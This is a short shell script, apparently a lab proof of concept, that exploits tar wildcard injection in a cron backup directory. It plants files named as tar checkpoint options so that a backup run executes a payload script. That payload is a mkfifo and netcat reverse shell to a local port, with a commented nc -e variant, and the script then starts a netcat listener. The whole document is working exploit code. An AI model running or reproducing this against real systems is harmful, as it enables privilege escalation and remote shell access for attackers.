#!/usr/bin/sh

printf "\n##### Create wildcard cron exploit #####\n\n"
mkdir -p /home/user/backup && cd /home/user/backup
# Create special files
touch --  --checkpoint=1
touch -- "--checkpoint-action=exec=sh poc.sh"

# Create the reverse shell
# echo 'nc -e /usr/bin/bash 127.0.0.1 9000' > poc.sh
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f' > poc.sh
nc -lvnp 9000
rm -- "--checkpoint-action=exec=sh poc.sh" --checkpoint=1 poc.sh
